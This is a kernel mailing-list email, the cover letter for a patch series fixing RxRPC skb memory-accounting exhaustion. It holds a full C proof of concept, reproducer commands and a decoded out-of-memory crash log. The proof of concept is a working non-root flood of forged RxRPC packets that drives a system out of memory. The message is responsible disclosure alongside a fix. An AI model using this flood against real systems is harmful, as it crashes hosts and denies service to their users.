Received: from mail-pg1-f176.google.com (mail-pg1-f176.google.com [209.85.215.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E3BEA26AC5
	for <netdev@vger.kernel.org>; Fri, 16 Oct 2026 20:01:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792180898; cv=none; b=RsW+yetqiwnlTtSsGyinKOy4gdJEbxju8XamV7LT25qKIAloCDHfYma5voyW3mam86mLavZMn1IJpYS0cDcWYTm+ecG6Du5eCynYgdQK4uyWmzASzgR56swwSiupHrSU8PA5FrD8odNGBOyziXU/6v4D9OnbAmEbgdb9um5eHJQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792180898; c=relaxed/simple;
	bh=bESMBTl9Y8FZHi1iLlpevNYLvAGC6GKhiAHk/bl6m3I=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=siGRB6OprZFXBS2Xc7wqk8QYGYaGIE8F6O6jiFX99sKqyI4447PNnPShfaAH4EIqJ+041hPLi/7ys1zVusahOLMD5R7mYyx/DPXatIAlhm/7A+u4lJ9Y/12SbcoEO9TU+UNWTOkSmp0I51g1osOa2/Eag66IK4K8ymjjbk5scI0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=VsHwsUzr; arc=none smtp.client-ip=209.85.215.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="VsHwsUzr"
Received: by mail-pg1-f176.google.com with SMTP id 41be03b00d2f7-cc1bc88a20eso274738a12.3
        for <netdev@vger.kernel.org>; Fri, 16 Oct 2026 13:01:35 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792180895; x=1792785695; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=S8d5mpZ3cZ98qQHHbvS82f4+ZBV/REhKTvwTcW1lxmI=;
        b=VsHwsUzr9zgsuV6Q5qBr/NbXZn4fOKOyi+qJEpQE0qcs9SXXRWUV1sdo91LovPUsDo
         h+2Aw6kf7M4bKkWwRGDTQCvgzQfPLQMblRr1sGvzxFxnCrq5qVMqvNQrHaeGjeenm9/j
         6Gk1ric/TIdDctoqO/3as198Y7LhzjikxQU9iUaGdPm/seRKWUKBC58wLV703xjbFCPQ
         6O7JVa7uAzBdXicNvnnQKkuLQpLFgQtyK3ju5hx8Gnn5O4Q28hfliWrDETA165AZyk9Q
         EhJlUCrHTgZ54fC3M5zWTF5BLxeMXKYTrtyGb+gcoeSl6wYm30hlRzLTk+9XWr6MvqaL
         ynmw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792180895; x=1792785695;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=S8d5mpZ3cZ98qQHHbvS82f4+ZBV/REhKTvwTcW1lxmI=;
        b=o/8aHWsWc0/zmyrAhJI6iOIIkCul5RutbPNjsEbwScSuNATNb/Ia/EIOaoEjln2wRr
         vM/CS2QBSjuYTmbmOgrgpwfOfdwk8e5dwH03eD80GbRn6NnS9Z/DEAucQM1OearHXyqg
         ADJN0MFZmk86LjHg+2raEhLmS1Zub3f590Y3Z8aw9f5ZgKO0umqZXR67z/GlWn+e2Pgk
         KVGTCgxg+4exzHTXCDu5TUTRPURWsXKJQb/XyKyy6B1M3fOGoGZ32Nm+JL7EtEysT1QU
         RzlRB0dLFUiNQVX9VpASJ4dzsOQxxeellhC2j0MY6gYa1PMa6ovkQRwuczCUeUowOv+l
         Yk1w==
X-Forwarded-Encrypted: i=1; AKwUvByAg3eY1nJgqd4C9+8eJc2h1KPdFGxVHPytbmXqP4IC1TkUyfPawIhQhjHlqyPLWoiiwcv77Kg=@vger.kernel.org
X-Gm-Message-State: AFq9FYJm+oAKalchDNpNczQ38r0GExf7PdOe06YaquVn103LGalZUlTG
	n9xwQ4GNqbqkGjkTlZXEi4sNuPhSB5qury9VrnedI/wCxWfFiXkybGe3TjrN9cJdpblX
X-Gm-Gg: AYBFou3r+Zzdm7tVKBW9PKBFW0kOGYbKQTCX+OzsM03JGMJh0UCbH6qs064tvtPvtGA
	IcJocTir7EIA1gwIIZuTuzV53sr/2TmjfpqdFxlORXsmmD+xNqPh9eMJMS/zhx25qpAyB05KiRB
	u8v+J7Y60X3ZpkfN3aF32kYutTvt4LAQlV1giVPtOX/CnxEkz8ovLTgY/5mTGPRfZkjFtivJ17d
	2VZIUOfFXRnfSzgF2IYIfWFgeBgZUxzBUt0uWeMnwznLCsxMAQbFjueby6hIUqE9VWKqDCfEyU0
	AEua2e7mpRlmXcwnx8xAXdJ+gtQHTSe05fz+pfK10tyar3bTOMZfA2nPx68QpnU1K4+A5Io5gAS
	JqeRqySWfOenVsVU4ck7kZ4emTAQ/0mpBcRGlNLmd5yxyQHbkv9iKtzxZh5Is1p1vL/NBaVlmD4
	5/1MnKFjXuOzgXXgDVaovBQ7BytPCQ+NMG5x8KqoKgfeN0LZMiXf2ZiV5sg3/TEqKbgRx/PtLgl
	1zsr8xh5RSGz8GKBV/sd4GbQ1v36OLdd3di/NJs
X-Received: by 2002:a05:6a21:a518:b0:3e1:c805:45d2 with SMTP id adf61e73a8af0-3e2262511d8mr264205637.17.1792180894561;
        Fri, 16 Oct 2026 13:01:34 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cd654850c61sm1688558a12.1.2026.10.16.13.01.28
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 16 Oct 2026 13:01:33 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-afs@lists.infradead.org,
	netdev@vger.kernel.org
Cc: dhowells@redhat.com,
	marc.dionne@auristor.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	root@tr0jan.top,
	zihanx@nebusec.ai
Subject: [PATCH net v10 0/3] rxrpc: fix encap_rcv skb accounting exhaustion
Date: Fri, 16 Oct 2026 19:59:50 +0000
Message-ID: <cover.1792168462.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in the RxRPC receive paths in
net/rxrpc/io_thread.c, net/rxrpc/local_object.c,
net/rxrpc/conn_event.c, net/rxrpc/conn_object.c, net/rxrpc/oob.c,
net/rxrpc/input.c, net/rxrpc/recvmsg.c, net/rxrpc/call_event.c,
net/rxrpc/call_object.c and net/rxrpc/skbuff.c. The bug is reachable
by a non-root user via user and network namespaces. We've tested it,
and it should not affect any other functionality.
The recorded baseline run is unpatched.
The v10 base is net/main at 191aa41548b2; the net/rxrpc subtree is
unchanged from the tested baseline at af32da41b032.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

rxrpc_encap_rcv() queues encapsulated UDP skbs on the RxRPC local queue
without charging them to the UDP socket's receive memory. If the I/O
thread cannot keep up, the local queue is not bounded by the UDP socket's
receive buffer.

After the I/O thread dequeues a packet, it can remain on conn->rx_queue,
in managed RXGK OOB or pending-response queues, or in a call's
recvmsg_queue without remaining under the UDP socket's rmem limit. The
DATA receive sequence window advances when packets arrive, while
rx_consumed advances only when the application reads them. Per-call
windows therefore do not bound retained DATA across multiple calls.

The unpatched net/main baseline at
af32da41b0327b9c6a37856ba82b6760d6c8d10e was tested in a 2-vCPU,
2-GiB QEMU guest with AF_RXRPC, AFS and KASAN enabled. The callback
listener was active on UDP 7001, and krxrpcio/7001 was starved by
a SCHED_FIFO priority-99 task on the same CPU. An unprivileged
sender with UID 1001 sent IPv6 UDP datagrams for 30 seconds from
16 threads. Each UDP payload was 36 bytes: a 28-byte RxRPC header
and an 8-byte application payload.

The run reached a system-wide OOM at 275.016 seconds. The decoded OOM
data recorded skbuff_small_head at 521844 KB and skbuff_head_cache at
243491 KB, while rxrpc_call_jar was 197 KB. The allocation path was the
sender's udpv6_sendmsg() -> sock_alloc_send_pskb() -> __alloc_skb();
this is the downstream symptom of the accumulated skb memory, rather
than a trace at the enqueue site. The guest panicked before a packet
count could be printed. These measured baseline results are the evidence
for the bug. The decoded crash log is included below; it was produced with
./scripts/decode_stacktrace.sh.

Changes since v9:
  - Release a queued CHALLENGE reference if processing exits early on an
    aborted connection.
  - Use a dedicated internal skb mark for OOB challenge packets instead of
    reusing the public OOB type enum.
  - Correct the aggregate DATA-accounting Fixes tag to 17926a79320a,
    retaining 5d7edbc9231e for the receive-window issue.
Link: https://lore.kernel.org/all/cover.1791994057.git.zihanx@nebusec.ai/

Reproducer:

    gcc -O2 -static -pthread -o poc_rxrpc_mem poc.c
    unshare -Urn ./poc_rxrpc_mem -t 16 -s 30 -l 8

packetdrill is not used here because the trigger depends on a sustained
multi-threaded flood with unique call IDs and deliberate I/O-thread
starvation, rather than a finite deterministic packet sequence.

The namespace command exercises the flood as a non-root user in a user
and network namespace. Since it omits -e, the PoC brings up loopback and
creates its own AF_RXRPC listener on UDP 7001 in that namespace. The OOM
measurements above additionally used privileged setup to pin krxrpcio/7001
and run a SCHED_FIFO hog on the other CPU; those conditions are not part
of the non-root reachability claim. For the recorded run, an AFS callback
listener was already active
on UDP 7001 and the PoC reused it with -e:

    sysctl -w vm.panic_on_oom=1
    sysctl -w vm.overcommit_memory=2
    sysctl -w vm.overcommit_ratio=50
    sysctl -w kernel.panic_on_warn=0
    IO_PID=$(ps -eT -o tid=,comm= | awk '$2 == "krxrpcio/7001" {print $1; exit}')
    taskset -p 2 "$IO_PID"
    taskset -c 1 chrt -f 99 /bin/sh -c 'while :; do :; done' &
    ip link set lo up
    taskset -c 0 runuser -u test_user -- ./poc_rxrpc_mem -e -t 16 -s 30 -l 8

The privileged setup brings lo up before runuser. The PoC then skips
SIOCSIFFLAGS because lo is already up, so test_user does not need
CAP_NET_ADMIN for the recorded sender run.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define RXRPC_PACKET_TYPE_DATA 1
#define RXRPC_CLIENT_INITIATED 0x01
#define RXRPC_SERVICE_ID 1
#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#define AFS_CB_CALLBACK_OP 204
#define DEFAULT_PORT 7001
#define DEFAULT_THREADS 4
#define DEFAULT_SECONDS 20
#define DEFAULT_PAYLOAD 8

struct __attribute__((packed)) rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t userStatus;
	uint8_t securityIndex;
	uint16_t reserved;
	uint16_t serviceId;
};

struct rxrpc_sockaddr {
	sa_family_t srx_family;
	uint16_t srx_service;
	uint16_t transport_type;
	uint16_t transport_len;
	union {
		sa_family_t family;
		struct sockaddr_in sin;
		struct sockaddr_in6 sin6;
	} transport;
};

struct thread_args {
	struct sockaddr_in6 dst;
	int seconds;
	size_t payload_len;
	uint32_t cid_seed;
	unsigned long sent;
};

static volatile sig_atomic_t stop_flag;

static void on_alarm(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void *sender_thread(void *arg)
{
	struct thread_args *ta = arg;
	int fd;
	char *packet;
	struct rxrpc_wire_header *hdr;
	uint32_t *op;
	uint32_t *count;
	uint32_t seq = 1;
	uint32_t cid = ta->cid_seed;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	packet = malloc(sizeof(*hdr) + ta->payload_len);
	if (!packet) {
		perror("malloc");
		close(fd);
		return NULL;
	}
	memset(packet + sizeof(*hdr), 0, ta->payload_len);
	hdr = (struct rxrpc_wire_header *)packet;
	hdr->callNumber = htonl(1);
	hdr->type = RXRPC_PACKET_TYPE_DATA;
	hdr->flags = RXRPC_CLIENT_INITIATED;
	hdr->userStatus = 0;
	hdr->securityIndex = 0;
	hdr->reserved = 0;
	hdr->serviceId = htons(RXRPC_SERVICE_ID);
	op = (uint32_t *)(packet + sizeof(*hdr));
	*op = htonl(AFS_CB_CALLBACK_OP);
	if (ta->payload_len >= 8) {
		count = op + 1;
		*count = htonl(1);
	}

	/*
	 * Each datagram is a new incoming RxRPC call (seq=1, unique cid).
	 * That makes the I/O thread do full incoming-call setup, so it
	 * falls behind encap_rcv and local->rx_queue can grow.
	 */
	while (!stop_flag) {
		hdr->epoch = htonl(0x80000000u | cid);
		hdr->cid = htonl(cid << 2);
		hdr->seq = htonl(1);
		hdr->serial = htonl(seq);
		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,
			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >= 0) {
			ta->sent++;
			seq++;
			cid += 32;
		}
	}

	free(packet);
	close(fd);
	return NULL;
}

static int bring_up_lo(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
		close(fd);
		return -1;
	}
	if (ifr.ifr_flags & IFF_UP) {
		close(fd);
		return 0;
	}
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static int start_rxrpc_listener(uint16_t port)
{
	struct rxrpc_sockaddr srx;
	int fd;

	fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET6);
	if (fd < 0)
		return -1;

	memset(&srx, 0, sizeof(srx));
	srx.srx_family = AF_RXRPC;
	srx.srx_service = RXRPC_SERVICE_ID;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in6);
	srx.transport.sin6.sin6_family = AF_INET6;
	srx.transport.sin6.sin6_port = htons(port);

	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0 ||
	    listen(fd, 1) < 0) {
		close(fd);
		return -1;
	}

	return fd;
}

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [-l payload_len] [-e]\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(DEFAULT_PORT),
	};
	const char *addr = "::1";
	int threads = DEFAULT_THREADS;
	int seconds = DEFAULT_SECONDS;
	size_t payload_len = DEFAULT_PAYLOAD;
	pthread_t *tids;
	struct thread_args *args;
	unsigned long total = 0;
	int listener_fd;
	int use_existing_listener = 0;
	int opt;

	while ((opt = getopt(argc, argv, "a:p:t:s:l:eh")) != -1) {
		switch (opt) {
		case 'a':
			addr = optarg;
			break;
		case 'p':
			dst.sin6_port = htons((uint16_t)strtoul(optarg, NULL, 0));
			break;
		case 't':
			threads = atoi(optarg);
			break;
		case 's':
			seconds = atoi(optarg);
			break;
		case 'l':
			payload_len = strtoul(optarg, NULL, 0);
			break;
		case 'e':
			use_existing_listener = 1;
			break;
		default:
			usage(argv[0]);
			return 1;
		}
	}

	if (threads <= 0 || seconds <= 0 || payload_len < 4 || payload_len > 65000) {
		usage(argv[0]);
		return 1;
	}
	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) != 1) {
		perror("inet_pton");
		return 1;
	}
	if (bring_up_lo() < 0) {
		perror("bring_up_lo");
		return 1;
	}

	listener_fd = -1;
	if (!use_existing_listener) {
		listener_fd = start_rxrpc_listener(ntohs(dst.sin6_port));
		if (listener_fd < 0) {
			perror("start_rxrpc_listener");
			return 1;
		}
	}

	signal(SIGALRM, on_alarm);
	alarm(seconds);

	tids = calloc((size_t)threads, sizeof(*tids));
	args = calloc((size_t)threads, sizeof(*args));
	if (!tids || !args) {
		perror("calloc");
		return 1;
	}

	pthread_attr_t attr;
	if (pthread_attr_init(&attr) != 0) {
		perror("pthread_attr_init");
		return 1;
	}
	if (pthread_attr_setstacksize(&attr, 64 * 1024) != 0) {
		perror("pthread_attr_setstacksize");
		return 1;
	}

	for (int i = 0; i < threads; i++) {
		args[i].dst = dst;
		args[i].seconds = seconds;
		args[i].payload_len = payload_len;
		args[i].cid_seed = 1 + (uint32_t)i;
		if (pthread_create(&tids[i], &attr, sender_thread, &args[i]) != 0) {
			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));
			stop_flag = 1;
			threads = i;
			break;
		}
	}
	pthread_attr_destroy(&attr);

	for (int i = 0; i < threads; i++) {
		pthread_join(tids[i], NULL);
		total += args[i].sent;
	}

	printf("sent_packets=%lu payload_len=%zu threads=%d duration=%d\n",
	       total, payload_len, threads, seconds);
	free(args);
	free(tids);
	if (listener_fd >= 0)
		close(listener_fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[  275.016678][ T9427] poc_rxrpc_mem invoked oom-killer: gfp_mask=0x40cc0(GFP_KERNEL|__GFP_COMP), order=0, oom_score_adj=0
[  275.016736][ T9427] CPU: 0 UID: 1001 PID: 9427 Comm: poc_rxrpc_mem Not tainted 7.3.0-rc6+ #1 PREEMPT(full) 
[  275.016747][ T9427] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  275.016751][ T9427] Call Trace:
[  275.016779][ T9427]  <TASK>
[  275.016790][ T9427]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[  275.016925][ T9427]  dump_stack (lib/dump_stack.c:129)
[  275.016932][ T9427]  dump_header (mm/oom_kill.c:464)
[  275.017004][ T9427]  out_of_memory (mm/oom_kill.c:1075 mm/oom_kill.c:1143)
[  275.017019][ T9427]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[  275.017034][ T9427]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[  275.017060][ T9427]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[  275.017074][ T9427]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[  275.017101][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
[  275.017133][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
[  275.017151][ T9427]  ? kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
[  275.017206][ T9427]  ? __sanitizer_cov_trace_const_cmp8 (kernel/kcov.c:317)
[  275.017217][ T9427]  ? policy_nodemask (mm/mempolicy.c:2304 (discriminator 1))
[  275.017234][ T9427]  alloc_pages_mpol (mm/mempolicy.c:2486)
[  275.017244][ T9427]  ? __pfx_alloc_pages_mpol (mm/mempolicy.c:2275)
[  275.017257][ T9427]  alloc_frozen_pages_noprof (mm/mempolicy.c:2557 (discriminator 1))
[  275.017269][ T9427]  allocate_slab (mm/slub.c:3345 (discriminator 2) mm/slub.c:3470)
[  275.017281][ T9427]  new_slab (mm/slub.c:3513)
[  275.017292][ T9427]  ___slab_alloc (mm/slub.c:4568)
[  275.017306][ T9427]  kmem_cache_alloc_node_noprof (mm/slub.c:4987 mm/slub.c:5068)
[  275.017319][ T9427]  ? __local_bh_enable_ip (kernel/softirq.c:478)
[  275.017335][ T9427]  ? __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
[  275.017349][ T9427]  __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
[  275.017359][ T9427]  ? __alloc_skb (include/linux/bottom_half.h:20 (discriminator 1) net/core/skbuff.c:697)
[  275.017370][ T9427]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
[  275.017382][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.017391][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
[  275.017407][ T9427]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6803)
[  275.017424][ T9427]  sock_alloc_send_pskb (net/core/sock.c:3022)
[  275.017436][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
[  275.017451][ T9427]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2854 (discriminator 2))
[  275.017463][ T9427]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[  275.017474][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
[  275.017486][ T9427]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
[  275.017511][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
[  275.017526][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
[  275.017548][ T9427]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
[  275.017557][ T9427]  ? ip6_mtu (net/ipv6/route.c:3296)
[  275.017569][ T9427]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
[  275.017581][ T9427]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
[  275.017592][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
[  275.017605][ T9427]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
[  275.017618][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.017632][ T9427]  udpv6_sendmsg (net/ipv6/udp.c:1720)
[  275.017643][ T9427]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[  275.017655][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
[  275.017672][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[  275.017684][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
[  275.017697][ T9427]  ? __pfx_avc_has_perm (security/selinux/avc.c:1154)
[  275.017755][ T9427]  ? sock_has_perm (security/selinux/hooks.c:5054 (discriminator 1))
[  275.017774][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[  275.017786][ T9427]  inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
[  275.017798][ T9427]  ? inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
[  275.017811][ T9427]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 net/socket.c:2281)
[  275.017823][ T9427]  ? __pfx___sys_sendto (net/socket.c:2235)
[  275.017837][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.017851][ T9427]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1544)
[  275.017875][ T9427]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[  275.017886][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.017895][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
[  275.017908][ T9427]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:45)
[  275.017925][ T9427]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[  275.017940][ T9427]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  275.017950][ T9427] RIP: 0033:0x423104
[  275.017958][ T9427] Code: 7d e8 89 4d d4 e8 ac e7 02 00 44 8b 4d d0 4c 8b 45 c8 89 c3 44 8b 55 d4 8b 7d e8 b8 2c 00 00 00 48 8b 55 d8 48 8b 75 e0 0f 05 <48> 3d 00 f0 ff ff 77 34 89 df 48 89 45 e8 e8 f9 e7 02 00 48 8b 45
All code
========
   0:	7d e8                	jge    0xffffffffffffffea
   2:	89 4d d4             	mov    %ecx,-0x2c(%rbp)
   5:	e8 ac e7 02 00       	call   0x2e7b6
   a:	44 8b 4d d0          	mov    -0x30(%rbp),%r9d
   e:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
  12:	89 c3                	mov    %eax,%ebx
  14:	44 8b 55 d4          	mov    -0x2c(%rbp),%r10d
  18:	8b 7d e8             	mov    -0x18(%rbp),%edi
  1b:	b8 2c 00 00 00       	mov    $0x2c,%eax
  20:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  24:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 34                	ja     0x66
  32:	89 df                	mov    %ebx,%edi
  34:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  38:	e8 f9 e7 02 00       	call   0x2e836
  3d:	48                   	rex.W
  3e:	8b                   	.byte 0x8b
  3f:	45                   	rex.RB

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 34                	ja     0x3c
   8:	89 df                	mov    %ebx,%edi
   a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   e:	e8 f9 e7 02 00       	call   0x2e80c
  13:	48                   	rex.W
  14:	8b                   	.byte 0x8b
  15:	45                   	rex.RB
[  275.017968][ T9427] RSP: 002b:00007fd17b1191b0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
[  275.017985][ T9427] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000423104
[  275.017991][ T9427] RDX: 0000000000000024 RSI: 00007fd15c000b70 RDI: 0000000000000008
[  275.017997][ T9427] RBP: 00007fd17b1191f0 R08: 000000001c46aae8 R09: 000000000000001c
[  275.018002][ T9427] R10: 0000000000000000 R11: 0000000000000293 R12: 00000000000087cf
[  275.018008][ T9427] R13: 000000008010f9c6 R14: 000000000043e718 R15: 000000001c46aae8
[  275.018020][ T9427]  </TASK>
[  275.048339][ T9427] Mem-Info:
[  275.048347][ T9427] active_anon:2922 inactive_anon:6285 isolated_anon:0
[  275.048347][ T9427]  active_file:0 inactive_file:27 isolated_file:0
[  275.048347][ T9427]  unevictable:1768 dirty:0 writeback:3
[  275.048347][ T9427]  slab_reclaimable:11444 slab_unreclaimable:236232
[  275.048347][ T9427]  mapped:150 shmem:2717 pagetables:574
[  275.048347][ T9427]  sec_pagetables:0 bounce:0
[  275.048347][ T9427]  kernel_misc_reclaimable:0
[  275.048347][ T9427]  free:16828 free_pcp:10 free_cma:0
[  275.048369][ T9427] Node 0 active_anon:11688kB inactive_anon:25140kB active_file:0kB inactive_file:108kB unevictable:7072kB isolated(anon):0kB isolated(file):0kB mapped:600kB dirty:0kB writeback:12kB shmem:10868kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9728kB pagetables:2296kB sec_pagetables:0kB all_unreclaimable? no Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[  275.048392][ T9427] Node 0 DMA free:5696kB boost:0kB min:524kB low:652kB high:780kB reserved_highatomic:0kB free_highatomic:0kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[  275.048420][ T9427] lowmem_reserve[]: 0 1295 1295 1295 1295
[  275.048435][ T9427] Node 0 DMA32 free:61616kB boost:18432kB min:62960kB low:74092kB high:85224kB reserved_highatomic:0kB free_highatomic:0kB active_anon:11688kB inactive_anon:25140kB active_file:0kB inactive_file:108kB unevictable:7072kB writepending:12kB zspages:0kB present:2080640kB managed:1326300kB mlocked:0kB bounce:0kB free_pcp:40kB local_pcp:40kB free_cma:0kB
[  275.048459][ T9427] lowmem_reserve[]: 0 0 0 0 0
[  275.048472][ T9427] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 1*64kB (U) 0*128kB 0*256kB 1*512kB (U) 1*1024kB (U) 2*2048kB (UM) 0*4096kB = 5696kB
[  275.048531][ T9427] Node 0 DMA32: 2469*4kB (UME) 729*8kB (UME) 364*16kB (UME) 196*32kB (UME) 104*64kB (UME) 60*128kB (ME) 26*256kB (ME) 19*512kB (UM) 1*1024kB (M) 1*2048kB (M) 0*4096kB = 61596kB
